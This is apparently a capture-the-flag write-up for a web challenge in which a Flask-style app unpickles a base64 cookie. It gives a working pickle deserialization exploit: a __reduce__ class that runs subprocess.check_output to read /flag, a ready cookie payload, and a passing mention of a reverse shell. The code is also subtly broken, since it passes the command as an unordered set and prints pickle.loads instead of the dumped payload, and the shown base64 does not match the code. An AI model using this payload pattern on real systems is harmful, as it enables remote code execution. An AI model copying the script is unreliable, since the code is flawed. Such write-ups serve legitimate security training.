![image](https://user-images.githubusercontent.com/63996033/231524500-ed44d2e9-71b4-4bf2-942e-b39446871141.png)

Solution:

```
This challenge uses an insecure deserialization vulnerability. Serialization in python is implemented with the pickle library.
The order is stored as a base64 encoded, pickled string in the user's cookie. 
However, the user can change the cookie to anything, so when the page depickles the data, this can result in RCE. 
To get the flag, a user can either inject a reverse shell to cat the flag from their local machine, 
or use subprocess.check_output to return the output of the command to the webpage.
```

script:

```py
import pickle
import base64
import subprocess


class RCE:
    def __reduce__(self):
        cmd = {"cat", "/flag"}
        return subprocess.check_output, (cmd,)


if __name__ == '__main__':
    data = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickle.loads(data)))
    
>>> b'gASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAxjaGVja19vdXRwdXSUk5SPlCiMA2NhdJSMBS9mbGFnlJCFlFKULg==' > set as the cookie
```

Flag: `RS{TH3_L345T_53CUR3_P1CKL3}`
